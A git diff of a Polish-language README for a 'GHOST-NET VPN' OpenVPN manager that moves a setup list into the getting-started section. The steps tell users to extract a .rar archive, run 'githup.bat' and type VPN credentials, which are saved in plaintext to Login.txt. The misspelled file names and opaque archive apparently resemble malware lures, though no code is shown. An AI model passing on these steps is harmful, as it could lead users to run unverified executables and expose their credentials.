@@ -40,7 +40,10 @@ Kompletny, przenośny manager połączeń OpenVPN z wbudowaną automatyzacją i 
 * `README.md` – Instrukcja obsługi.
 
 ## 🚀 Jak zacząć?
-
+1. Pobierz i wypakuj `tcp_udp servers opemvpn.rar`.
+2. Uruchom plik `githup.bat`.
+3. Podaj swoje dane logowania VPN, gdy skrypt o to poprosi (dane zostaną zapisane w `Login.txt`).
+4. Wybierz serwer z listy i aktywuj **GHOST MODE**.
 
 ---
 
@@ -49,8 +52,3 @@ Kompletny, przenośny manager połączeń OpenVPN z wbudowaną automatyzacją i 
 *Lead Developer & Network Security Enthusiast*
 
 Projekt **GHOST-NET VPN** powstał z pasji do bezpiecznych sieci i automatyzacji. Jeśli podoba Ci się moja praca, śledź moje repozytorium po więcej aktualizacji!
-
-1. Pobierz i wypakuj `tcp_udp servers opemvpn.rar`.
-2. Uruchom plik `githup.bat`.
-3. Podaj swoje dane logowania VPN, gdy skrypt o to poprosi (dane zostaną zapisane w `Login.txt`).
-4. Wybierz serwer z listy i aktywuj **GHOST MODE**.
